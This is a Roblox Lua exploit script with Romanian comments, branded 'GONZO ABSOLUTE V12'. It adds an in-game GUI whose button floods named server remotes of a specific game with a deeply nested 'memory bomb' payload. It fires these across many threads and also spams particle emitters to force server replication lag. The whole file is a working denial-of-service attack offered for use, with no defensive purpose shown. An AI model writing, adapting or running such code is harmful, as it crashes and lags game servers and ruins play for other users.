local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

-- --- TARGETE CRITICE ---
local net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
local targets = {
    net:FindFirstChild("RF/ValentinesShopService/SearchUser"),
    net:FindFirstChild("RF/RodsShopService/RequestBuy"),
    net:FindFirstChild("RF/BrainrotTraderService/Fetch"),
    net:FindFirstChild("RE/PlotService/CashCollected"),
    ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true)
}

-- --- GENERATOR DE BOMBĂ DE MEMORIE (NUCLEAR L10) ---
local function getAbsolutePayload()
    local root = {}
    for i = 1, 30 do -- 30 de rădăcini masive
        local layer = root
        for depth = 1, 10 do -- 10 NIVELURI DE ADÂNCIME
            layer["L" .. depth] = { ["Data"] = string.rep("💣", 100), ["TS"] = tick() }
            layer = layer["L" .. depth]
        end
    end
    return root
end

-- --- INTERFAȚĂ GUI ---
local ScreenGui = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 340, 0, 450)
MainFrame.Position = UDim2.new(0.5, -170, 0.2, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
MainFrame.BorderSizePixel = 2
MainFrame.Active, MainFrame.Draggable = true, true

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "GONZO ABSOLUTE V12"
Title.TextColor3 = Color3.new(1, 0, 0)
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.Font = Enum.Font.GothamBlack

-- --- HELPER SLIDER ---
local function CreateSlider(name, pos, minVal, maxVal, default)
    local Label = Instance.new("TextLabel", MainFrame)
    Label.Size = UDim2.new(1, 0, 0, 25)
    Label.Position = pos
    Label.Text = name .. ": " .. default
    Label.TextColor3 = Color3.new(1, 1, 1)
    Label.BackgroundTransparency = 1
    local Bar = Instance.new("Frame", MainFrame)
    Bar.Size = UDim2.new(0.8, 0, 0, 4)
    Bar.Position = pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size = UDim2.new(0, 16, 0, 16)
    Knob.Position = UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.new(1, 0, 0)
    Knob.Text = ""
    local val = default
    local dragging = false
    Knob.MouseButton1Down:Connect(function() dragging = true end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local p = math.clamp((input.Position.X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            val = minVal + (p * (maxVal - minVal))
            Label.Text = name .. ": " .. string.format("%.1f", val)
        end
    end)
    return function() return val end
end

local GetIntensity = CreateSlider("INTENSITY (WAVES)", UDim2.new(0, 0, 0.15, 0), 1, 100, 20)
local GetPackets = CreateSlider("PACKETS PER REMOTE", UDim2.new(0, 0, 0.3, 0), 1, 100, 30)
local GetPhysics = CreateSlider("PHYSICS GLITCH", UDim2.new(0, 0, 0.45, 0), 0, 200, 0)

local ActionBtn = Instance.new("TextButton", MainFrame)
ActionBtn.Size = UDim2.new(0.8, 0, 0, 60)
ActionBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
ActionBtn.Text = "EXECUTE ABSOLUTE OVERLOAD"
ActionBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
ActionBtn.TextColor3 = Color3.new(1, 1, 1)

-- --- MOTORUL DE ANNIHILARE ---
local isActive = false
ActionBtn.MouseButton1Click:Connect(function()
    isActive = not isActive
    ActionBtn.Text = isActive and "OVERLOADING..." or "EXECUTE ABSOLUTE OVERLOAD"
    ActionBtn.BackgroundColor3 = isActive and Color3.new(1, 0, 0) or Color3.fromRGB(80, 0, 0)
    
    if isActive then
        -- 1. NETWORK SHREDDER (MULTITHREADED)
        task.spawn(function()
            while isActive do
                local payload = getAbsolutePayload()
                for _, r in pairs(targets) do
                    if r then
                        for wave = 1, GetIntensity() do
                            task.spawn(function()
                                for i = 1, GetPackets() do
                                    pcall(function()
                                        if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
                                    end)
                                end
                            end)
                        end
                    end
                end
                task.wait(0.1) -- Rotație ultra-rapidă
            end
        end)
        
        -- 2. PHYSICS & REPLICATION GLITCH (FPS + SERVER LAG)
        task.spawn(function()
            while isActive do
                local stress = GetPhysics()
                if stress > 0 then
                    for i = 1, stress do
                        task.defer(function()
                            local p = Instance.new("ParticleEmitter", Players.LocalPlayer.Character.PrimaryPart)
                            p.Enabled = false -- Nu consumă GPU-ul tău, dar serverul trebuie să îl replice
                            task.delay(0.1, function() p:Destroy() end)
                        end)
                    end
                end
                task.wait(0.05)
            end
        end)
    end
end)
